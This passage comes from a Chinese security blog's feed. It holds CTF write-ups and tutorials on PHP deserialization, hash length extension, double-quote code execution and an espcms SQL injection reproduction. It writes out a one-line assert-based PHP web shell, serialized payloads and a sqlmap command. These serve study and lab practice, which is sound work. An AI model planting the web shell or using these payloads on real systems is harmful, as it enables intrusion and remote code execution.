title="参考资料"></a>参考资料</h1><p><strong>书籍：</strong><br>《Web前端黑客技术揭秘》<br>《XSS跨站脚本攻击剖析与防御》<br>《白帽子讲Web安全》<br>《黑客攻防技术宝典Web实战篇》第二版<br><strong>文章：</strong><br><a href="https://xz.aliyun.com/t/2936">XSS小结</a><br><a href="https://github.com/dwqs/blog/issues/68">浅说 XSS 和 CSRF</a><br><a href="https://blog.csdn.net/h_mxc/article/details/50542038">Session攻击手段(会话劫持/固定)及其安全防御措施</a>  </p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><a href="https://github.com/ChrisLinn/greyhame-2017/blob/master/skills/web.md">https://github.com/ChrisLinn/greyhame-2017/blob/master/skills/web.md</a>  2017灰袍技能精华<br><a href="https://github.com/rajeshmajumdar/BruteXSS">https://github.com/rajeshmajumdar/BruteXSS</a> BruteXSS<br><a href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a> Beef神器<br><a href="https://github.com/1N3/XSSTracer">https://github.com/1N3/XSSTracer</a> 用于检查跨站点跟踪的小型python脚本<br><a href="https://github.com/0x584A/fuzzXssPHP">https://github.com/0x584A/fuzzXssPHP</a> 一个非常简单的反射XSS扫描仪支持GET/POST<br><a href="https://github.com/chuhades/xss_scan">https://github.com/chuhades/xss_scan</a> 反射xss扫描器<br><a href="https://github.com/BlackHole1/autoFindXssAndCsrf">https://github.com/BlackHole1/autoFindXssAndCsrf</a> 浏览器的插件，它自动检查页面是否具有xss和漏洞<br><a href="https://github.com/shogunlab/shuriken">https://github.com/shogunlab/shuriken</a> xss命令行工具用于测试web应用程序中xss负载列表<br><a href="https://github.com/UltimateHackers/XSStrike">https://github.com/UltimateHackers/XSStrike</a> 用于XSS、WAF检测和旁路的模糊和蛮力参数<br><a href="https://github.com/stamparm/DSXS">https://github.com/stamparm/DSXS</a> 一个完全功能的跨站点脚本漏洞扫描器，支持获取和发布参数，并写入100行代码  </p>]]></content>
      
      
      <categories>
          
          <category> 原创栏目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化漏洞的简单学习</title>
      <link href="2018/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"/>
      <url>2018/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>在PHP中，序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。</p><h1 id="PHP序列化与反序列化"><a href="#PHP序列化与反序列化" class="headerlink" title="PHP序列化与反序列化"></a>PHP序列化与反序列化</h1><p>谈到PHP序列化与反序列化<br>那么必须涉及到两个函数<code>serialize()</code>与<code>unserialize()</code><br>前者是将一个对象进行序列化后者是其反过程</p><h2 id="serialize"><a href="#serialize" class="headerlink" title="serialize()"></a>serialize()</h2><p>先来看看此函数的解释<br><img src="https://img.0x002.com/article/PHPSerialize/5bd4934800039.webp" alt=""><br>函数返回的是一串字符串，可以对如数组和对象进行序列化处理</p><a id="more"></a><p>下面给出两个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">//对数组进行序列化</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&#x27;Apple&#x27;</span> ,<span class="string">&#x27;b&#x27;</span> =&gt; <span class="string">&#x27;banana&#x27;</span> , <span class="string">&#x27;c&#x27;</span> =&gt; <span class="string">&#x27;Coconut&#x27;</span>);</span><br><span class="line"><span class="comment">//序列化数组</span></span><br><span class="line"><span class="variable">$s</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"><span class="comment">//输出结果：a:3:&#123;s:1:&quot;a&quot;;s:5:&quot;Apple&quot;;s:1:&quot;b&quot;;s:6:&quot;banana&quot;;s:1:&quot;c&quot;;s:7:&quot;Coconut&quot;;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">name1</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test1</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test3</span> = <span class="keyword">new</span> name1;</span><br><span class="line"><span class="variable">$test3</span>-&gt;test1 = <span class="string">&#x27;hack &#x27;</span>;</span><br><span class="line"><span class="variable">$test3</span>-&gt;test2 = <span class="string">&#x27;fun&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$test3</span>); </span><br><span class="line"><span class="comment">//输出结果：O:5:&quot;name1&quot;:2:&#123;s:5:&quot;test1&quot;;s:5:&quot;hack &quot;;s:5:&quot;test2&quot;;s:3:&quot;fun&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>对于序列化后得到的字符串解释如图<br><img src="https://img.0x002.com/article/PHPSerialize/5bd496e29a917.webp" alt=""></p><h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize()"></a>unserialize()</h2><p>将已序列化的字符串进行反序列，即恢复序列化前<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">name1</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test1</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;O:5:&quot;name1&quot;:2:&#123;s:5:&quot;test1&quot;;s:5:&quot;hack &quot;;s:5:&quot;test2&quot;;s:3:&quot;fun&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$ser</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">print_r(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><img src="https://img.0x002.com/article/PHPSerialize/5bd4985a10303.webp" alt=""></p><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>看似安全的序列化其实存在漏洞，而且一旦能利用就一般危害不小，在代码审计中我们需要格外注意此类型漏洞。<br>序列化漏洞常见的魔法函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">construct():当一个类被创建时自动调用</span><br><span class="line">destruct():当一个类被销毁时自动调用</span><br><span class="line">invoke():当把一个类当作函数使用时自动调用</span><br><span class="line">tostring():当把一个类当作字符串使用时自动调用</span><br><span class="line">wakeup():当调用unserialize()函数时自动调用</span><br><span class="line">sleep():当调用serialize()函数时自动调用</span><br><span class="line">__call():当要调用的方法不存在或权限不足时自动调用</span><br></pre></td></tr></table></figure><hr><p>简单测试如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__wakeup&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__construct&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__destruct&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class2</span> = <span class="string">&#x27;O:7:&quot;chybeta&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;123&quot;;&#125;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$class2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$class2_unser</span> = unserialize(<span class="variable">$class2</span>);</span><br><span class="line">print_r(<span class="variable">$class2_unser</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><img src="https://img.0x002.com/article/PHPSerialize/5bd49a2003e1e.jpg" alt=""><br>由前可以看到，unserialize()后会导致<strong>wakeup() 或</strong>destruct()的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在<strong>wakeup() 或</strong>destruct()中，从而当我们控制序列化字符串时可以去直接触发它们。(这里因为懒直接照搬了某大佬的原文）</p><h3 id="绕过魔法函数"><a href="#绕过魔法函数" class="headerlink" title="绕过魔法函数"></a>绕过魔法函数</h3><p><strong>魔法函数sleep() 和 wakeup()<br>php文档中定义__wakeup():<br>unserialize() 执行时会检查是否存在一个 wakeup() 方法。如果存在，则会先调用 wakeup 方法，预先准备对象需要的资源。wakeup()经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。sleep()则相反，是用在序列化一个对象时被调用.</strong><br>正常情况下的反序列化来漏洞如下图：<br><img src="https://img.0x002.com/article/PHPSerialize/5b90f7f9ae0d0.jpg" alt=""><br>析构方法和__wakeup都能够执行<br>如果我们把传入的序列化字符串的属性个数更改成大于1的任何数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;hpdoger&quot;:2:&#123;s:1:&quot;a&quot;;s:6:&quot;u know&quot;;&#125;</span><br></pre></td></tr></table></figure><p>得到的结果如图，__wakeup没有被执行，但是执行了析构函数</p><hr><h2 id="反序列化漏洞实战"><a href="#反序列化漏洞实战" class="headerlink" title="反序列化漏洞实战"></a>反序列化漏洞实战</h2><ul><li>南邮CTF<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>&#123; <span class="comment">//定义了一个类</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$enter</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">        <span class="variable">$pass</span>=stripslashes(<span class="variable">$pass</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$o</span> = unserialize(<span class="variable">$pass</span>); <span class="comment">//进行反序列化处理</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$o</span>) &#123;</span><br><span class="line">        <span class="variable">$o</span>-&gt;secret = <span class="string">&quot;*&quot;</span>; <span class="comment">//这里不知道*代表的是啥</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$o</span>-&gt;secret === <span class="variable">$o</span>-&gt;enter) <span class="comment">//要求$o中的两个属性值相同</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Congratulation! Here is my secret: &quot;</span>.<span class="variable">$o</span>-&gt;secret;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Oh no... You can&#x27;t fool me&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;are you trolling?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>由于我们不知道<code>*</code>代表的是什么，故我们需要用指针来直接使两属性相等。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$enter</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> just4fun;</span><br><span class="line"><span class="variable">$o</span>-&gt;enter = &amp;<span class="variable">$o</span>-&gt;secret; <span class="comment">//这里的a=&amp;b 即代表将b的指针赋值给a 无论b的值怎么变 a始终等于b</span></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$o</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>本地运行即可得到序列化字符串<br><code>O:8:&quot;just4fun&quot;:2:&#123;s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;&#125;</code><br>然后将此作为pass参数GET发送即可获得flag</li></ul>]]></content>
      
      
      <categories>
          
          <category> 原创栏目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF实验吧让我进去writeup</title>
      <link href="2018/CTF%E5%AE%9E%E9%AA%8C%E5%90%A7%E8%AE%A9%E6%88%91%E8%BF%9B%E5%8E%BBwriteup/"/>
      <url>2018/CTF%E5%AE%9E%E9%AA%8C%E5%90%A7%E8%AE%A9%E6%88%91%E8%BF%9B%E5%8E%BBwriteup/</url>
      
        <content type="html"><![CDATA[<h1 id="初探题目"><a href="#初探题目" class="headerlink" title="初探题目"></a>初探题目</h1><p><img src="https://img.0x002.com/article/CTFLetmeinWriteUp/5bcf2b29d3962.webp" alt=""><br>两个表单，我们用burp抓包试试<br><img src="https://img.0x002.com/article/CTFLetmeinWriteUp/5bcf2f8d4e0ca.webp" alt=""><br>这时候我们发现Cookie值里有个很奇怪的值是source，这个单词有起源的意思，我们就可以猜测这个是判断权限的依据，让我们来修改其值为1，发送得到如下显示：<br><img src="https://img.0x002.com/article/CTFLetmeinWriteUp/5bcf3112ab7be.webp" alt=""></p><a id="more"></a><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><p>发现爆出了源代码，让我们来审计一下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;</span>;</span><br><span class="line"><span class="variable">$secret</span> = <span class="string">&quot;XXXXXXXXXXXXXXX&quot;</span>; <span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;getmein&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode(<span class="variable">$username</span>) === <span class="string">&quot;admin&quot;</span> &amp;&amp; urldecode(<span class="variable">$password</span>) != <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$COOKIE</span>[<span class="string">&quot;getmein&quot;</span>] === md5(<span class="variable">$secret</span> . urldecode(<span class="variable">$username</span> . <span class="variable">$password</span>))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Congratulations! You are a registered user.\n&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;The flag is &quot;</span>. <span class="variable">$flag</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;You are not an admin! LEAVE.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">&quot;sample-hash&quot;</span>, md5(<span class="variable">$secret</span> . urldecode(<span class="string">&quot;admin&quot;</span> . <span class="string">&quot;admin&quot;</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;source&quot;</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">&quot;source&quot;</span>, <span class="number">0</span>, time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;source&quot;</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>; <span class="comment">// This source code is outputted here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们如果需要获得flag，需要满足一下条件：<br>1.Cookie中getmein的值不能为空<br>2.username必须为admin和password不能为admin<br>3.Cookie中的getmein必须等于<code>md5($secret.urldecode($username.$password))</code><br>满足这三个条件才可获得flag，可是我们无法得知$secret的值为多少<br><code>setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));</code><br>发现下面有行代码是这样写的，将输出的<code>md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;))</code>作为cookie输出，结合前面的数据包我们可以知道输出的值为<code>571580b26c65f306376d4f64e53cb5c7</code> 可是这串md5是由$secret+’adminadmin’转md5而得到的，如果我们在password输入admin将不满足前面所需的三个条件</p><h1 id="死局转生"><a href="#死局转生" class="headerlink" title="死局转生"></a>死局转生</h1><p>我们知道常见的md5是16位的，而这里的md5正是16位，我们的$secret是十五位的,加上’adminadmin’就变成25位了，很明显这里的md5肯定会出现重复，所以我们可以哈希长度拓展攻击绕过这个死局<br>这里附两个讲述具体原理的链接:<br><a href="http://www.freebuf.com/articles/web/69264.html">http://www.freebuf.com/articles/web/69264.html</a> <a href="https://www.cnblogs.com/p00mj/p/6288337.html">https://www.cnblogs.com/p00mj/p/6288337.html</a></p><p>在Kali下用hashpump操作<br><img src="https://img.0x002.com/article/CTFLetmeinWriteUp/20181007123528335098.png" alt=""><br>最好我们构造数据包，把生成的数据发送即可获得flag<br><img src="https://img.0x002.com/article/CTFLetmeinWriteUp/20181007123529050946.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 原创栏目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP中双引号引起的命令执行漏洞</title>
      <link href="2018/PHP%E4%B8%AD%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%BC%95%E8%B5%B7%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>2018/PHP%E4%B8%AD%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%BC%95%E8%B5%B7%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>在PHP语言中，单引号和双引号都可以表示一个字符串，但是对于双引号来说，可能会对引号内的内容进行二次解释，这就可能会出现安全问题。</strong></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>举个简单例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; 1;</span><br><span class="line">$b &#x3D; 2;</span><br><span class="line">echo &#39;$a$b&#39;;&#x2F;&#x2F;输出结果为$a$b</span><br><span class="line">echo &quot;$a$b&quot;;&#x2F;&#x2F;输出结果为12</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以看到这两个输出的结果并不相同。</p><a id="more"></a><p>在双引号中倘若有${}出现，那么{}内的内容将被当做代码块来执行。<br><img src="https://img.0x002.com/article/PHPDoubleQuotesEval/5b4621bf02bfa.webp" alt=""><br>可以看到成功执行了phpinfo()</p><hr><p>试想一下，倘若在一个cms的后台，可以修改数据库的配置文件，且配置文件中的值用双引号包括，我们虽然也可以直接闭合代码达到getshell的后果，但是如果cms对传递的参数进行了addlashes()处理的话，我们就无法去闭合代码了，但这时我们可以传入${命令}就可以达到getshell的目的。</p><hr><p>现在，让我们来修改一下代码，让我们不只能输出phpinfo<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &quot;$&#123;@assert($_POST[a])&#125;&quot;;?&gt; &#x2F;&#x2F;@是用来防止输出错误信息的</span><br></pre></td></tr></table></figure><br><img src="https://img.0x002.com/article/PHPDoubleQuotesEval/5b4624108fe85.webp" alt=""><br>菜刀成功连接</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文简单记录了双引号可能会引发的代码执行的情况<br>对于这种漏洞的防御，一定要明确单引号与双引号的区别所在，不要简单认为两者是互相可以替代的，在平时的代码书写中能只用单引号一定不要用双引号，毕竟单引号的解释时间也比双引号少得多，代码运行相对更快。</p>]]></content>
      
      
      <categories>
          
          <category> 原创栏目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>读书笔记之CMS漏洞复现集合</title>
      <link href="2018/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B9%8Bespcms%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2018/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B9%8Bespcms%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>最近在看法师的代码审计企业级代码安全架构一书，打算对书中所列出的cms漏洞进行复现，无技术含量。</strong></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><blockquote><p>1.phpstudy环境整合包<br>2.各种cms安装包<br>3.《代码审计企业级代码安全架构》<br>4.Seay源代码审计系统</p></blockquote><h3 id="复现一之espcms注入漏洞"><a href="#复现一之espcms注入漏洞" class="headerlink" title="复现一之espcms注入漏洞"></a>复现一之espcms注入漏洞</h3><p>漏洞文件位置：espcms\adminsoft\control\citylist.php<br><img src="https://img.0x002.com/article/espcms/5b44ac7267bba.webp" alt=""></p><a id="more"></a><p>可以看到这里有一个sql请求，并且请求中包含着变量$parentid。<br>并且$parentid的赋值句子为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$parentid &#x3D; $this-&gt;fun-&gt;accept(&#39;parentid&#39;, &#39;R&#39;)</span><br></pre></td></tr></table></figure><p>这里引用对象进行赋值<br>我们查找accept这个自定义函数，看看是否有可能会有sql注入。<br><img src="https://img.0x002.com/article/espcms/5b44ae0884788.webp" alt=""><br>可以看出这个函数是_用来通过<strong>$_POST、$_GET、$_COOKIE</strong> 三种方法来接收数据并保存为数组变量$var<br>最后通过一个daddslashes()函数对数据进行单引号等字符的过滤<br>但是我们前面所提到的sql语句中并不需要我们去闭合单引号，那么这句造成了一个sql注入漏洞<br>我们来找一下那些文件实例化了这个类<br>这个类名叫important，我们直接进行全局搜索<br>可以看到在adminsoft\index.php文件实例化了该类<br><img src="https://img.0x002.com/article/espcms/5b44b198bed0a.webp" alt=""><br>Tips:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$control &#x3D; new important();&#x2F;&#x2F;实例化important类</span><br><span class="line">$action &#x3D; &#39;on&#39; . $action;&#x2F;&#x2F;&#39;变量赋值&#39;</span><br><span class="line">if (method_exists($control, $action)) &#123;&#x2F;&#x2F;检测方法是否此名字</span><br><span class="line">$control-&gt;$action();&#x2F;&#x2F;如果存在则使用important类中的方法</span><br></pre></td></tr></table></figure><p>成功注入<br><img src="https://img.0x002.com/article/espcms/5b44b66dd1b38.webp" alt=""><br>用sqlmap测试一下<br>因为该漏洞需要登录，即需要cookie验证，我们用burpsuite抓下数据包，并保存到sqlmap目录下的1.txt里，然后再用sqlmap，输入命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -r 1.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.0x002.com/article/espcms/5b44be1a1629f.webp" alt=""></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>此漏洞涉及到php编程中的面向对象问题、addslashes()函数等知识点，比较基础</p>]]></content>
      
      
      <categories>
          
          <category> 原创栏目 </category>
          
      </categories>
      
      
        <tags>
